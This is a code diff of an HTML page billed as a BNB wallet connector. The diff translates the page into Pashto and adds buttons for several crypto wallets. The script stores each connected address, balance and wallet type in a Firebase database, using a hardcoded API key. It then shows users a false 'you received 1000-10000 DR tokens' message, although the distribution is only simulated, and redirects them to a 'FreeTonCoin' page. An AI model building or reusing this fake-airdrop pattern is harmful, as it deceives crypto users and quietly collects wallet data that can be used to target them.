@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BNB Wallet Connector</title>
+    <title>BNB والیټ کونیکټور</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -34,7 +34,14 @@
             margin-bottom: 20px;
         }
         
-        button {
+        .wallet-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .wallet-btn {
             background-color: #f0b90b;
             color: white;
             border: none;
@@ -43,13 +50,21 @@
             cursor: pointer;
             font-size: 16px;
             transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
         
-        button:hover {
+        .wallet-btn:hover {
             background-color: #d8a90a;
         }
         
-        button:disabled {
+        .wallet-btn img {
+            width: 20px;
+            height: 20px;
+        }
+        
+        .wallet-btn:disabled {
             background-color: #cccccc;
             cursor: not-allowed;
         }
@@ -79,35 +94,60 @@
 </head>
 <body>
     <header>
-        <h1>BNB Wallet Connector</h1>
-        <p>Connect your BNB Smart Chain wallet to interact with our platform</p>
+        <h1>BNB والیټ کونیکټور</h1>
+        <p>خپل BNB سمارټ چین والیټ وصل کړئ</p>
     </header>
     
     <div class="main-content">
         <div class="wallet-section">
-            <button id="connectWalletBtn">Connect Wallet</button>
+            <h3>والیټ انتخاب کړئ:</h3>
+            <div class="wallet-buttons">
+                <button class="wallet-btn" id="metamaskBtn">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask">
+                    MetaMask
+                </button>
+                <button class="wallet-btn" id="trustwalletBtn">
+                    <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet">
+                    Trust Wallet
+                </button>
+                <button class="wallet-btn" id="tokenpocketBtn">
+                    <img src="https://assets.tokenpocket.sg/icon/TP-logo.png" alt="TokenPocket">
+                    TokenPocket
+                </button>
+                <button class="wallet-btn" id="okxBtn">
+                    <img src="https://www.okx.com/cdn/assets/imgs/239/4CCE7D5B1D1E503A.png" alt="OKX">
+                    OKX Wallet
+                </button>
+                <button class="wallet-btn" id="binanceBtn">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Binance_Logo.png" alt="Binance">
+                    Binance Chain
+                </button>
+            </div>
+            
             <div id="walletInfo" class="wallet-info">
-                <h3>Wallet Connected</h3>
-                <p>Address: <span id="walletAddress"></span></p>
+                <h3>والیټ وصل شو</h3>
+                <p>ادرس: <span id="walletAddress"></span></p>
+                <p>نیټورک: <span id="walletNetwork"></span></p>
                 <div class="balance">
-                    Balance: <span id="walletBalance">0</span> BNB
+                    بیلانس: <span id="walletBalance">0</span> BNB
                 </div>
             </div>
         </div>
         
         <div id="tokenDistribution" class="token-distribution hidden">
-            <h2>Token Distribution</h2>
-            <p>You have received 1000-10000 DR tokens!</p>
+            <h2>ټوکن ویش</h2>
+            <p>تاسو 1000-10000 DR ټوکنونه ترلاسه کړي!</p>
         </div>
     </div>
 
-    <!-- Include Firebase and BNB chain libraries -->
+    <!-- د Firebase او BNB چین لایبریرۍ -->
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
 
     <script>
-        // Firebase configuration
+        // د Firebase کانفیګوریشن
         const firebaseConfig = {
             apiKey: "AIzaSyD4UbW_Iy4kUWH3V70Q1mWCI4-_KFk6ku4",
             authDomain: "onlinewark-a0147.firebaseapp.com",
@@ -118,106 +158,178 @@
             appId: "1:92155538620:android:5e198a8eea6bf17f61f4b9"
         };
 
-        // Initialize Firebase
+        // Firebase ته پیل ورکړئ
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Check if Web3 is injected (MetaMask or similar)
-        if (typeof window.ethereum !== 'undefined') {
-            console.log('Web3 detected!');
-            window.web3 = new Web3(window.ethereum);
-        } else {
-            alert('Please install MetaMask or another Web3 provider to use this site!');
-        }
-
-        // Connect Wallet Button
-        document.getElementById('connectWalletBtn').addEventListener('click', async () => {
+        // د والیټ وصلولو فنکشن
+        async function connectWallet(walletType) {
             try {
-                // Request account access
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const account = accounts[0];
+                let provider;
+                let account;
                 
-                // Display wallet info
+                // د مختلفو والیټونو لپاره وصلولو میتودونه
+                switch(walletType) {
+                    case 'metamask':
+                        if (!window.ethereum) {
+                            throw new Error('مهرباني وکړئ MetaMask انسټال کړئ');
+                        }
+                        provider = window.ethereum;
+                        await provider.request({ method: 'eth_requestAccounts' });
+                        break;
+                        
+                    case 'trustwallet':
+                        if (!window.ethereum) {
+                            throw new Error('مهرباني وکړئ Trust Wallet انسټال کړئ');
+                        }
+                        provider = window.ethereum;
+                        await provider.request({ method: 'eth_requestAccounts' });
+                        break;
+                        
+                    case 'tokenpocket':
+                        if (!window.tokenpocket) {
+                            throw new Error('مهرباني وکړئ TokenPocket انسټال کړئ');
+                        }
+                        provider = window.tokenpocket.ethereum;
+                        await provider.request({ method: 'eth_requestAccounts' });
+                        break;
+                        
+                    case 'okx':
+                        if (!window.okxwallet) {
+                            throw new Error('مهرباني وکړئ OKX Wallet انسټال کړئ');
+                        }
+                        provider = window.okxwallet;
+                        await provider.request({ method: 'eth_requestAccounts' });
+                        break;
+                        
+                    case 'binance':
+                        provider = new WalletConnectProvider({
+                            rpc: {
+                                56: "https://bsc-dataseed.binance.org/"
+                            }
+                        });
+                        await provider.enable();
+                        break;
+                        
+                    default:
+                        throw new Error('ناسم والیټ ټایپ');
+                }
+                
+                // Web3 ته پیل ورکړئ
+                const web3 = new Web3(provider);
+                const accounts = await web3.eth.getAccounts();
+                account = accounts[0];
+                
+                // د والیټ معلومات ښکاره کړئ
                 document.getElementById('walletAddress').textContent = account;
                 document.getElementById('walletInfo').style.display = 'block';
-                document.getElementById('connectWalletBtn').textContent = 'Wallet Connected';
-                document.getElementById('connectWalletBtn').disabled = true;
                 
-                // Get balance
+                // د نیټورک معلومات ترلاسه کړئ
+                const chainId = await web3.eth.getChainId();
+                let networkName;
+                switch(chainId) {
+                    case 56: networkName = "BNB Smart Chain"; break;
+                    case 97: networkName = "BNB Smart Chain Testnet"; break;
+                    default: networkName = `Unknown (${chainId})`;
+                }
+                document.getElementById('walletNetwork').textContent = networkName;
+                
+                // د بیلانس ترلاسه کړئ
                 const balance = await web3.eth.getBalance(account);
                 const balanceInBNB = web3.utils.fromWei(balance, 'ether');
                 document.getElementById('walletBalance').textContent = balanceInBNB;
                 
-                // Save to Firebase
-                saveWalletToFirebase(account, balanceInBNB);
+                // Firebase ته خوندي کړئ
+                saveWalletToFirebase(account, balanceInBNB, walletType);
                 
-                // Distribute tokens if balance meets criteria
+                // د ټوکنونو ویش
                 if (parseFloat(balanceInBNB) > 0) {
                     distributeTokens(account);
                 }
                 
-                // Redirect to home page after connection
+                // د Home پاڼې ته لیږد
                 setTimeout(() => {
                     window.location.href = "https://afgtrade.github.io/FreeTonCoin";
                 }, 2000);
                 
             } catch (error) {
-                console.error('Error connecting wallet:', error);
-                alert('Error connecting wallet. Please try again.');
+                console.error('د والیټ په وصلولو کې ستونزه:', error);
+                alert(`ستونزه: ${error.message}`);
             }
-        });
+        }
 
-        // Save wallet info to Firebase
-        function saveWalletToFirebase(address, balance) {
+        // د والیټ معلومات Firebase ته خوندي کول
+        function saveWalletToFirebase(address, balance, walletType) {
             const walletRef = database.ref('wallets/' + address);
             walletRef.set({
                 address: address,
                 balance: balance,
+                walletType: walletType,
                 connectedAt: new Date().toISOString()
             }).then(() => {
-                console.log('Wallet saved to Firebase');
+                console.log('والیټ Firebase ته خوندي شو');
             }).catch((error) => {
-                console.error('Error saving wallet:', error);
+                console.error('د والیټ په خوندي کولو کې ستونزه:', error);
             });
         }
 
-        // Simulate token distribution
+        // د ټوکنونو ویش
         function distributeTokens(address) {
-            // Show token distribution section
+            // د ټوکن ویش برخه ښکاره کړئ
             document.getElementById('tokenDistribution').classList.remove('hidden');
             
-            // Generate random amount between 1000 and 10000
+            // د 1000 او 10000 ترمنځ تصادفي مقدار
             const tokenAmount = Math.floor(Math.random() * 9001) + 1000;
             
-            // Save token distribution to Firebase
+            // د ټوکن ویش Firebase ته خوندي کول
             const tokensRef = database.ref('tokenDistributions/' + address);
             tokensRef.set({
                 token: 'DR',
                 amount: tokenAmount,
                 distributedAt: new Date().toISOString()
             }).then(() => {
-                console.log('Tokens distributed and saved to Firebase');
+                console.log('ټوکنونه ویشل شوي او Firebase ته خوندي شول');
             }).catch((error) => {
-                console.error('Error distributing tokens:', error);
+                console.error('د ټوکنونو په ویشلو کې ستونزه:', error);
             });
         }
 
-        // Check if wallet is already connected
+        // د والیټ بټنونو لپاره ایونټ لیسنر
+        document.getElementById('metamaskBtn').addEventListener('click', () => connectWallet('metamask'));
+        document.getElementById('trustwalletBtn').addEventListener('click', () => connectWallet('trustwallet'));
+        document.getElementById('tokenpocketBtn').addEventListener('click', () => connectWallet('tokenpocket'));
+        document.getElementById('okxBtn').addEventListener('click', () => connectWallet('okx'));
+        document.getElementById('binanceBtn').addEventListener('click', () => connectWallet('binance'));
+
+        // د پیل په وخت کې د وصل شوي والیټ چک
         window.addEventListener('load', async () => {
             if (window.ethereum) {
-                const accounts = await web3.eth.getAccounts();
-                if (accounts.length > 0) {
-                    // Wallet already connected
-                    const account = accounts[0];
-                    document.getElementById('walletAddress').textContent = account;
-                    document.getElementById('walletInfo').style.display = 'block';
-                    document.getElementById('connectWalletBtn').textContent = 'Wallet Connected';
-                    document.getElementById('connectWalletBtn').disabled = true;
-                    
-                    // Get balance
-                    const balance = await web3.eth.getBalance(account);
-                    const balanceInBNB = web3.utils.fromWei(balance, 'ether');
-                    document.getElementById('walletBalance').textContent = balanceInBNB;
+                try {
+                    const web3 = new Web3(window.ethereum);
+                    const accounts = await web3.eth.getAccounts();
+                    if (accounts.length > 0) {
+                        // والیټ دمخه وصل دی
+                        const account = accounts[0];
+                        document.getElementById('walletAddress').textContent = account;
+                        document.getElementById('walletInfo').style.display = 'block';
+                        
+                        // د نیټورک معلومات
+                        const chainId = await web3.eth.getChainId();
+                        let networkName;
+                        switch(chainId) {
+                            case 56: networkName = "BNB Smart Chain"; break;
+                            case 97: networkName = "BNB Smart Chain Testnet"; break;
+                            default: networkName = `Unknown (${chainId})`;
+                        }
+                        document.getElementById('walletNetwork').textContent = networkName;
+                        
+                        // د بیلانس ترلاسه کړئ
+                        const balance = await web3.eth.getBalance(account);
+                        const balanceInBNB = web3.utils.fromWei(balance, 'ether');
+                        document.getElementById('walletBalance').textContent = balanceInBNB;
+                    }
+                } catch (error) {
+                    console.error('د وصل شوي والیټ په چک کې ستونزه:', error);
                 }
             }
         });
